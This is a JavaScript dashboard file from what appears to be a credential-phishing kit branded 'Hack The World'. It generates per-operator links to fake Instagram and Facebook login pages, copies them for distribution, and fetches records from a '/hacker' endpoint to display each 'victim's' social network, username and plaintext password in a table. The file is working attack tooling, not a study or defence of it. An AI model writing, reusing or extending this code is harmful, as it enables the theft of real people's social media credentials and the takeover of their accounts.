import { dbUrl, domain } from "./variables.js";

const user = JSON.parse(sessionStorage.getItem("user"));

if (!user) window.location.href = "../html/login.html";

// logout

let logoutLink = document.getElementById("logout-link");

logoutLink.addEventListener("click", () => {
  sessionStorage.removeItem("user");
  window.location.href = "./login.html";
});

// copy link to clip board

function copyStringToClipboard(str) {
  return new Promise((resolve, reject) => {
    // Create new element
    var el = document.createElement("textarea");
    el.value = str;

    el.setAttribute("readonly", "");
    el.style = { position: "absolute", left: "-9999px" };
    document.body.appendChild(el);

    // Select text inside element
    el.select();
    el.setSelectionRange(0, 99999);

    document.execCommand("copy"); // copy
    document.body.removeChild(el); // Remove temporary element

    resolve();
  });
}

let copyBtn1 = document.querySelector(".copy-btn-1");
let copyBtn2 = document.querySelector(".copy-btn-2");
copyBtn1.addEventListener("click", async (e) => {
  let userFromDb = await fetch(
    `${dbUrl}/users?name=${user.name}&email=${user.email}`
  );
  userFromDb = await userFromDb.json();
  userFromDb = userFromDb[0];
  let social = "instagram";

  let link = `${domain}/assets/pages/${social}/index.html?id=${userFromDb.id}`;

  copyStringToClipboard(link).then(() => {
    swal("Hack The World 🌎", "Link copied successfully", "success");
  });
});
copyBtn2.addEventListener("click", async (e) => {
  let userFromDb = await fetch(
    `${dbUrl}/users?name=${user.name}&email=${user.email}`
  );
  userFromDb = await userFromDb.json();
  userFromDb = userFromDb[0];
  let social = "facebook";

  let link = `${domain}/assets/pages/${social}/index.html?id=${userFromDb.id}`;

  copyStringToClipboard(link).then(() => {
    swal("Hack The World 🌎", "Link copied successfully", "success");
  });
});

// dom

document.getElementById("user-name").innerText = user.name;

// password database setup

const getUserDetail = async () => {
  // getting user details from database

  let userFromDb = await fetch(
    `${dbUrl}/users?name=${user.name}&email=${user.email}`
  );
  userFromDb = await userFromDb.json();
  userFromDb = userFromDb[0];

  let passwordDb = document.getElementById("password-db");

  let targets = await fetch(`${dbUrl}/hacker?userId=${userFromDb.id}`);
  targets = await targets.json();

  targets.map((victim) => {
    passwordDb.innerHTML += `
      <tr>
        <th scope="row">🤵</th>
        <td>${victim.social}</td>
        <td>${victim.username}</td>
        <td>${victim.password}</td>
      </tr>
    `;
  });
};

getUserDetail();
